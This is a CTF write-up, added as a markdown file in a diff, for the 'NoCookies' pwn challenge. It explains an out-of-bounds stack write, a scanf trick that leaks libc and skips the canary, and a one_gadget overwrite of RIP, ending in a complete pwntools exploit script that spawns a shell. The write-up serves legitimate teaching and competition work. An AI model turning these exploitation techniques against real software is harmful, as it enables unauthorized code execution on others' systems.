@@ -1,0 +1,370 @@
+---
+title: Cyber-Hackathon 24 - Quals - Pwn - NoCookies
+date: '2024-10-13'
+tags: ['pwn', 'ignite', 'cyber-hackathon-24', 'oob-write', 'one_gadget']
+draft: false
+summary: Utilizing an out-of-bound write to leak Libc and gain rbp/rip control and get shell using one_gadget
+---
+
+# Challenge Description
+
+> Due to the platform being unstable, I was unable to get the description of the challenge
+
+# Solution
+
+The challenge was an easy pwn challenge which I managed to solve in almost 10 minutes, but due to infra being down, I submitted the flag almost 30 minutes later :(. We're given the following files in the challenge's zip:
+
+```
+.
+├── chall
+├── ld-linux-x86-64.so.2
+└── libc.so.6
+
+```
+
+Using [pwninit](https://github.com/io12/pwninit), I patched the binary.
+
+- **[Reversing](#reversing)**
+- **[Vulnerabilities](#vulnerabilities)**
+  - **[OOB Write](#oob-write)**
+- **[Exploitation](#exploitation)**
+  - **[Leaking LIBC using OOB-Write](#leaking-libc-using-oob-write)**
+  - **[Spawning a shell using One-Gadget](#spawning-a-shell-using-one-gadget)**
+
+Firstly, looking at the mitigations on the binary:
+
+![mitigations](/static/writeups/cyberhackathon24-quals/image.png)
+
+## Reversing
+
+The decompilation of the `vuln` function is:
+
+```c
+unsigned __int64 vuln()
+{
+  __int64 v1; // [rsp+8h] [rbp-128h] BYREF
+  __int64 v2; // [rsp+10h] [rbp-120h] BYREF
+  __int64 v3; // [rsp+18h] [rbp-118h]
+  _QWORD v4[33]; // [rsp+20h] [rbp-110h] BYREF
+  unsigned __int64 v5; // [rsp+128h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  v3 = 0LL;
+  v1 = 0LL;
+  v2 = 0LL;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        menu();
+        __isoc99_scanf("%ld%*c", &v2);
+        if ( v2 == 3 )
+          exit(0);
+        if ( v2 <= 3 )
+          break;
+LABEL_13:
+        puts("invalid choice");
+      }
+      if ( v2 != 1 )
+        break;
+      printf("d > ");
+      __isoc99_scanf("%ld%*c", &v4[3 * v3]);
+      printf("s > ");
+      __isoc99_scanf("%15s", &v4[3 * v3++ + 1]);
+    }
+    if ( v2 != 2 )
+      goto LABEL_13;
+    printf("idx > ");
+    __isoc99_scanf("%ld%*c", &v1);
+    if ( v1 < 0 || v3 <= v1 )
+      break;
+    printf("d := %ld\ns := %s\n", v4[3 * v1], (const char *)&v4[3 * v1 + 1]);
+  }
+  puts("no buenos");
+  return v5 - __readfsqword(0x28u);
+}
+```
+
+Now, the function is fairly small with a simple menu:
+
+```c
+1. add
+2. show
+3. exit
+```
+
+### Add
+
+The `add` functionality is as follows:
+
+```c
+printf("d > ");
+__isoc99_scanf("%ld%*c", &v4[3 * v3]);
+printf("s > ");
+__isoc99_scanf("%15s", &v4[3 * v3++ + 1]);
+```
+
+Now, the layout for each input will result in a chunk similar to this:
+
+```
+| ---- (index [d]) (8-Bytes) ---- | ---- (string [s]) (8-bytes) ---- |
+| ---- (string[s]) (7-bytes) ---- | -------------------------------- |
+```
+
+Now, for each chunk, we control around 15+8 = 23 bytes of data.
+
+### Show
+
+For functionality of show:
+
+```c
+printf("idx > ");
+__isoc99_scanf("%ld%*c", &v1);
+if ( v1 < 0 || v3 <= v1 )
+  break;
+printf("d := %ld\ns := %s\n", v4[3 * v1], (const char *)&v4[3 * v1 + 1]);
+```
+
+The functionality of `show` is pretty non-trivial, it simply checks if the input buffer is `less than or equal to` the number of chunks written on the stack so far and then prints the first chunk as a long and then dereferences the next chunk to print the data.
+
+## Exploitation
+
+- **[Leaking LIBC using OOB-Write](#leaking-libc-using-oob-write)**
+- **[Spawning a shell using One-Gadget](#spawning-a-shell-using-one-gadget)**
+
+### Leaking LIBC using OOB-Write
+
+Now, as mentioned in [Add](#add), we can write `23 bytes` of data. However, since there is no boundary checking, we can write `23 bytes` of data `N` times on the stack. We can test this theory by simply writing bunch of `"A"` on the stack and then check:
+
+```py:exploit.py
+def menu(idx):
+  io.sendlineafter(b"> ", encode(idx))
+
+def add(d, s):
+  menu(1)
+  menu(encode(d))
+  menu(encode(s))
+
+add(0, b"A"*10)
+add(1, b"B"*10)
+add(2, b"C"*10)
+add(3, b"D"*10)
+```
+
+Looking at the stack layout:
+
+![Stack Layout](/static/writeups/cyberhackathon24-quals/image-1.png)
+
+We can see, that after our next input, there is a libc address:
+
+![Libc Leak](/static/writeups/cyberhackathon24-quals/image-2.png)
+
+So, if we were to write two chunks, we might get a leak
+
+```py:exploit.py
+add(4, b"E"*10)
+add(5, b"F"*10)
+```
+
+![Updated Stack Layout](/static/writeups/cyberhackathon24-quals/image-3.png)
+
+Now, looking close at the layout of `F-chunk`:
+
+```c
+0x7fffffffd2f0: 0x0000000000004545      0x0000000000000005
+0x7fffffffd300: 0x4646464646464646      0x0000155555004646
+```
+
+Now, we can see, writing `10-bytes` to the chunk, overwrote the first two-bytes of our libc address, we can prevent this by using `sendline` instead of `sendlineafter` in pwntools. We'll modify the functions as follows:
+
+```py:exploit.py
+def menu(idx, ln=True):
+  sender = io.sendlineafter if ln else io.sendafter
+  sender(b"> ", encode(idx))
+
+def add(d, s, ln = True):
+  menu(1)
+  menu(encode(d))
+  menu(encode(s), ln=ln)
+
+...
+add(5, b"F"*8, ln=False)
+```
+
+Now, after this, the stack layout becomes the following:
+
+```c
+0x7fffffffd2f0: 0x0000000000004545      0x0000000000000005
+0x7fffffffd300: 0x4646464646464646      0x00001555553773f5
+```
+
+Running the show option in the binary and sending index as `5`, we get the following output:
+
+![alt text](/static/writeups/cyberhackathon24-quals/image-4.png)
+
+Well, this was a fail.
+
+> **NOTE:** The above mentioned technique was something I tried when writing this writeup, the technique below is what I initially used during the ctf.
+
+Well, the technique I used was simply bypassing writing input in a chunk by breaking `scanf` for `d` input. In case of `%ld`, if we pass a character, `scanf` would break and the input buffer passed won't be flushed by scanf and will automatically be passed as input into the next scanf, which in our case is the string input. So, what we'll do, instead of sending two inputs to the add function, we'll modify it to take just one, i.e. `d`, which will eventually prevent overwriting the actual libc address, and then when we print the `5th` address, we'll print the libc address at `0x7fffffffd2f0` as a long decimal, which will be easy to parse as well. The modified `add` function will be as follows:
+
+```py
+def add(d, ln=True):
+  menu(1)
+  menu(d, ln=ln)
+```
+
+Looking at the latest stack layout:
+
+```
+0x7fffffffd2f0: 0x0000000000004545      0x0000155555503aa0
+0x7fffffffd300: 0x4646464646464646      0x0000155555377300
+```
+
+Now, we can see that our chunk did not write over the libc address, if we were to run show:
+
+![Libc Leak](/static/writeups/cyberhackathon24-quals/image-5.png)
+
+Now, for `d`, we get a really large value, checking this value in gdb:
+
+![Calculating Libc](/static/writeups/cyberhackathon24-quals/image-6.png)
+
+Now, we need to parse this leak, for this, our updated exploit becomes:
+
+```py:exploit.py
+for i in range(6):
+	add(b"A"*8)
+
+show(5)
+
+io.recvuntil(b"d := ")
+libc.address = int(io.recvline()[:-1]) - 0x21aaa0
+info("libc @ %#x" % libc.address)
+```
+
+### Spawning a shell using One-Gadget
+
+Now, since we have a libc leak, the next thing we can do is to either write ROP on the stack (that is how [stdnoerr](https://stdnoerr.github.io/) did it.). In order to write a rop, we'll revert the add function to write all `23-bytes` instead of the `15-bytes` that we're doing in our breaking-scanf case. Now, we need to find the return address, we can simply use gdb to locate the canary in our stack frame, then after the canary, we'll have `rbp` and then the return-address.
+
+![Finding out the RBP/RIP](/static/writeups/cyberhackathon24-quals/image-7.png)
+
+Now, can see that our canary is at `0x7fffffffd388` and our return address is at `0x7fffffffd398`. Let's write more data onto the stack:
+
+```py:exploit.py
+add(b"B"*14)
+add(b"C"*14)
+add(b"D"*14)
+add(b"E"*14)
+add(b"F"*14)
+```
+
+![Write Before Canary](/static/writeups/cyberhackathon24-quals/image-8.png)
+
+After writing 5 new chunks on the stack, we notice that we've written it just 8-bytes before the canary. Now, due to us using the scanf breaking technique, the next chunk we'll write will skip writing at the canary, meaning that our input will just skip writing at the canary and give us a write primitive on the RBP and RIP/Return address.
+
+Now, let's write "AAAAAAAA" to our RIP and check the register values to see which `one_gadget` will be suitable:
+
+```py
+for i in range(5):
+	add(b"A"*8)
+
+add(flat(
+	b"A"*8, # RBP
+	b"B"*7  # return address
+))
+
+```
+
+Now, the stack layout becomes:
+
+```c
+0x7fffffffd380: 0x0000000000000000      0x69ca5c864facf900
+0x7fffffffd390: 0x4141414141414141      0x0042424242424242
+```
+
+Now, the problem becomes, how do we use `ret`? If we press `3`, the program would invoke `exit` and it will simply exit. Looking at the decompilation, we see:
+
+```c:decompilation
+printf("idx > ");
+__isoc99_scanf("%ld%*c", &v1);
+if ( v1 < 0 || v3 <= v1 )
+  break;
+printf("d := %ld\ns := %s\n", v4[3 * v1], (const char *)&v4[3 * v1 + 1]);
+```
+
+We can see that, if our input, i.e. `v1`, when using the `show` option, becomes > `v3`, i.e. the number of chunks written so far, it would break out of the loop and then return to main.
+
+We can simply invoke by passing a random integer to the show:
+
+![RIP Control](/static/writeups/cyberhackathon24-quals/image-9.png)
+
+Boom! We control RIP. Looking at the register, only a single one-gadget looked reasonable:
+
+```c
+0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
+constraints:
+  address rbp-0x50 is writable
+  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+```
+
+Now, the only thing we need to do, is point `rbp` to a value that is:
+
+1. [rbp-0x70] is writable and NULL
+2. [rbp-0x48] is NULL to prevent ARGV in execve from breaking.
+
+For this, I simply pointed it to the BSS section of libc. The final exploit becomes:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./chall_patched"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = remote(sys.argv[1], int(sys.argv[2])
+	) if args.REMOTE else process([exe], aslr=False)
+
+def menu(idx, ln=True):
+  sender = io.sendlineafter if ln else io.sendafter
+  sender(b"> ", encode(idx))
+
+
+def add(d, ln = True):
+  menu(1)
+  menu(encode(d), ln=ln)
+
+def show(idx):
+	menu(2)
+	menu(idx)
+
+for i in range(6):
+	add(b"A"*8)
+
+show(5)
+
+io.recvuntil(b"d := ")
+libc.address = int(io.recvline()[:-1]) - 0x21aaa0
+info("libc @ %#x" % libc.address)
+
+for i in range(5):
+	add(b"A"*8)
+
+add(flat(
+	libc.bss(), # RBP
+	libc.address + 0xebd43  # return address
+))
+
+show(123123)
+io.clean()
+
+io.interactive()
+```
+
+![shell](/static/writeups/cyberhackathon24-quals/image-10.png)
+
+Overall, the challenge was a pretty good challenge however the infra made the overall experience of the quals pretty bad. Our team had 2 more challenges solved locally, but we couldn't access the infra to spawn an instance, get the flag and submit :(. Guess it happens.
